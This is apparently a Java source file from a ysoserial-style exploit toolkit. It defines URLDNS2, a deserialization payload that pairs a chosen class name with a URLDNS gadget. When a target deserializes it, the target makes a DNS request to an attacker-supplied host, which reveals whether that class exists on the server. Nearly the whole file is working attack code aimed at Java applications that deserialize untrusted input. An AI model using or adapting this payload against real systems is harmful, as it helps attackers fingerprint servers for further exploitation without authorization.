import javassist.CannotCompileException;
import javassist.ClassPool;
import me.gv7.woodpecker.yso.payloads.ObjectPayload;
import me.gv7.woodpecker.yso.payloads.URLDNS;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;

import java.io.*;
import java.util.*;

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String url = command.split("\\|")[0];
        String clazzName = command.split("\\|")[1];
        Class clazz = getClass(clazzName);
        Object urldns = new URLDNS().getObject(url);
        Map<Object,Object> x = new HashMap<Object,Object>();
        x.put(clazz,urldns);
        return x;
    }


    public Class getClass(String clazzName) throws CannotCompileException {
        try {
            return Class.forName(clazzName);
        }catch (Exception e){
            try {
                return Thread.currentThread().getContextClassLoader().loadClass(clazzName);
            }catch (Exception ee){
                ClassPool pool = ClassPool.getDefault();
                return pool.makeClass(clazzName).toClass();
            }
        }
    }

    public static void main(String[] args) throws Exception {
        //PayloadRunner.run(URLDNS2.class, args);
        //System.out.println(int.class..getName());


        //ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("ok.ser"));
        //objectInputStream.readObject();

    }
}
